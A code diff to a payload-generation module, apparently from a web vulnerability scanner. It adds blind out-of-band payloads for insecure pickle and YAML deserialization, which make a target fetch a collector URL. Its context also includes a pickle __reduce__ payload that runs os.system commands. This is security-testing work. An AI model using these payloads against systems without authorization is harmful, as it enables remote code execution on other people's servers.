@@ -4,6 +4,7 @@ import os
 import re
 import pickle
 import sys
+import urllib.request
 from urllib.parse import urlparse
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -75,7 +76,7 @@ class PayloadMutation:
         if self.probe in ("flip_boolean", "modify_string","modify_integer"):
             return self.__mutated_php_choose() + [m for m in self._php_mutation() if "error" not in m]
         if self.probe == "pickle_exec":
-            return self._mutate_pickle()
+            return self._mutate_pickle() + self._mutate_pickle_oob()
         if self.probe == "yaml_exec":
             return self._mutate_yaml()
         if self.probe in ("node_serialize", "proto_pollution"):
@@ -746,6 +747,15 @@ class PayloadMutation:
         def __reduce__(self):
             return (os.system, (self.command,))
 
+    class _PickleOOB:
+        def __init__(self, url):
+            self.url = url
+
+        def __reduce__(self):
+            # urllib.request.urlopen — a pure-Python outbound GET, so no curl/wget needs
+            # to exist on the target for the blind callback to fire.
+            return (urllib.request.urlopen, (self.url,))
+
     def _mutate_pickle(self) -> Mutations:
         results: Mutations = []
         for cmd in self.PICKLE_TEST_COMMANDS:
@@ -758,6 +768,28 @@ class PayloadMutation:
             payload["note"] = "Payload is a pickled object whose __reduce__ calls os.system(command)"
             results.append(payload)
         return results
+
+    def _mutate_pickle_oob(self) -> Mutations:
+        """Blind-confirmation variant: a pickle whose __reduce__ makes the target perform
+        an outbound HTTP GET to the OOB collector. For blind sinks where the deserialized
+        result never appears in the response, the in-band oracle sees nothing — only a hit
+        in the collector log (keyed by this vector's token) proves the pickle ran. No-op
+        unless an OOB domain/collector is configured."""
+        oob_domain = get_oob_domain()
+        if not oob_domain:
+            return []
+        url = f"http://{oob_domain}/"
+        try:
+            raw = pickle.dumps(self._PickleOOB(url))
+        except Exception:
+            return []
+        b64 = base64.b64encode(raw).decode()
+        payload = self._make_payload("pickle_oob", "urllib.urlopen via __reduce__", url, b64)
+        payload["note"] = (
+            f"Blind OOB canary — on pickle.loads() the target fetches {url}; check the "
+            "collector log for a callback on this vector's token to confirm execution"
+        )
+        return [payload]
 
 
     YAML_TEST_COMMANDS = TEST_COMMANDS
@@ -779,7 +811,28 @@ class PayloadMutation:
             payload["payload_raw"] = raw
             payload["note"] = "Requires target to use yaml.load()/yaml.unsafe_load() without SafeLoader"
             results.append(payload)
-        return results
+        return results + self._mutate_yaml_python_oob()
+
+    def _mutate_yaml_python_oob(self) -> Mutations:
+        """Blind-confirmation variant for yaml.load()/unsafe_load(): instead of running a
+        local command whose output must surface in the response, it makes the target fetch
+        the OOB collector (pure-Python urllib — no curl/wget needed). No-op unless OOB set."""
+        oob_domain = get_oob_domain()
+        if not oob_domain:
+            return []
+        url = f"http://{oob_domain}/"
+        raw = (
+            "!!python/object/apply:urllib.request.urlopen\n"
+            f"args: ['{url}']"
+        )
+        b64 = base64.b64encode(raw.encode()).decode()
+        payload = self._make_payload("yaml_oob", "python/object/apply:urllib.request.urlopen", url, b64)
+        payload["payload_raw"] = raw
+        payload["note"] = (
+            f"Blind OOB canary — yaml.load()/unsafe_load() fetches {url}; check the collector "
+            "log for a callback on this vector's token to confirm the sink executed"
+        )
+        return [payload]
 
     def _mutate_yaml_java(self) -> Mutations:
         oob_domain = get_oob_domain()
